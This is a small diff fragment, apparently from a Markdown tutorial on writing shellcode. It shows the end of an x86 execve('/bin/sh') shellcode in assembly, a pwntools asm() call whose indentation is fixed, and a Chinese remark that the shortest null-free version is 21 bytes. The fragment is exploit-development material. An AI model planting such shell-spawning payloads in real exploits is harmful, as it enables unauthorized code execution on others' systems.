@@ -27,7 +27,7 @@ push 0x6e69622f
 mov ebx,esp               
 int 0x80                  
 '''                       
-  shellcode=asm(shellcode)
+shellcode=asm(shellcode)
 ```
 无"\x00"最短 21 byte
 
